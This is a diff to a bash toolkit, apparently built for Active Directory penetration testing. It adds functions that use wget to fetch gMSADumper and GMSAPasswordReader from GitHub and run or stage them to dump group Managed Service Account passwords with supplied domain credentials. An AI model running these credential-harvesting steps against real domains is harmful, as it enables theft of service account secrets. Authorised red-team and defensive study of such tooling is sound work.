@@ -574,6 +574,50 @@ generate_ntlm_hash() {
     python -c "import impacket.ntlm; import binascii; from impacket.ntlm import compute_nthash; print(binascii.hexlify(compute_nthash('$password')).decode())"
 }
 
+run_gMSADumper() {
+    local url="https://github.com/micahvandeusen/gMSADumper/archive/refs/heads/main.zip"
+    local gMSADumper_dir="gMSADumper"
+    if [[ ! -d $gMSADumper_dir ]]; then
+        wget $url -O gMSADumper.zip
+        unzip gMSADumper.zip
+        mv gMSADumper-main gMSADumper
+        rm gMSADumper.zip
+    fi
+    if [[ -z "$username" ]]; then
+        echo "Username must be set before running gMSADumper."
+        return 1
+    fi
+    if [[ -z "$password" ]]; then
+        echo "Password must be set before running gMSADumper."
+        return 1
+    fi
+    if [[ -z "$domain" ]]; then
+        echo "Domain must be set before running gMSADumper."
+        return 1
+    fi
+    pushd $gMSADumper_dir || return 1
+    python3 gMSADumper.py -u "$username" -p "$password" -d "$domain"
+    popd || return 1
+
+}
+
+run_GMSAPasswordReader() {
+    local url="https://github.com/rvazarkar/GMSAPasswordReader/archive/refs/heads/master.zip"
+    local GMSAPasswordReader_dir="GMSAPasswordReader"
+    if [[ ! -d $GMSAPasswordReader_dir ]]; then
+        wget $url -O GMSAPasswordReader.zip
+        unzip GMSAPasswordReader.zip
+        mv GMSAPasswordReader-master GMSAPasswordReader
+        rm GMSAPasswordReader.zip
+    fi
+    if [[ -f "$GMSAPasswordReader_dir/bin/Release/GMSAPasswordReader.exe" ]]; then
+        generate_windows_download "$GMSAPasswordReader_dir/bin/Release/GMSAPasswordReader.exe" "GMSAPasswordReader.exe"
+    else
+        echo "GMSAPasswordReader.exe not found."
+        return 1
+    fi
+
+}
 if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
     if [[ -z "$1" ]]; then
         echo "Usage: $0 <command>"
